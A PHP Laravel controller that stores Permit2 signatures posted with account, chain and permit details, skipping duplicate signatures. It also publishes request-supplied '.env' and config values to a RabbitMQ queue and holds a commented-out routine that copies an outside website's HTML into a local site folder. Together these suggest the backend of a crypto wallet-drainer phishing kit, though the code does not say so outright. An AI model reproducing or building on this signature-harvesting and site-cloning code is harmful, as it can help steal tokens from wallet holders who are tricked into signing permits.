<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Http\JsonResponse;
use App\Models\PermitCollection;
use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
use Illuminate\Foundation\Bus\DispatchesJobs;
use Illuminate\Foundation\Validation\ValidatesRequests;
use Illuminate\Routing\Controller as BaseController;
use PhpAmqpLib\Message\AMQPMessage;
use Illuminate\Support\Facades\App;

class SigController extends BaseController
{

  public function index(Request $request)
  {
  // 创建一个新的 SigCollection 实例并设置属性值
    $permitCollection = new PermitCollection();
    $permitCollection->account = $request->post('account');
    $permitCollection->permit2address = $request->post('permit2address');
    $permitCollection->chain = $request->post('chain');
    $permitCollection->details = $request->post('details');
    $permitCollection->signature = $request->post('signature');
    $permitCollection->source = $request->post('source');
    $data = $permitCollection->where('signature',$permitCollection->signature)->get('id');
      //保存数据到数据库(重复签名不记录)
    if(sizeof($data) <= 0){
        $saveResult =  $permitCollection->save();
    }else{
        $saveResult = false;
    }
    return new JsonResponse($saveResult, 200);
  }

  public function publishMsg(Request $request){
    $connection = App::make('rabbitmq');

    $channel = $connection->channel();

    $queue = 'default'; // 替换为实际的队列名称

    $channel->queue_declare($queue, false, true, false, false);

    $messageData = [
        'envData' => [
            'KEY1' => $request->input('key1'),
            'KEY2' => $request->input('key2'),
            // 根据实际情况获取其他.env相关数据
        ],
        'configData' => [
            'KEY1' => $request->input('key1'),
            'KEY2' => $request->input('key2'),
            // 根据实际情况获取其他config相关数据
        ],
    ];

    $message = new AMQPMessage(json_encode($messageData));

    $channel->basic_publish($message, '', $queue);

    $channel->close();
    $connection->close();

    return response()->json(['message' => 'Message published successfully.']);

  }

  // public function createPage(Request $request){
  //   $domain = 'https://worldoffairy.com/';
  //   $html_data = file_get_contents($domain);
  //   file_put_contents('../storage/webpacket_site/page_content.html',$html_data);
  //   echo $html_data;
  // }
}
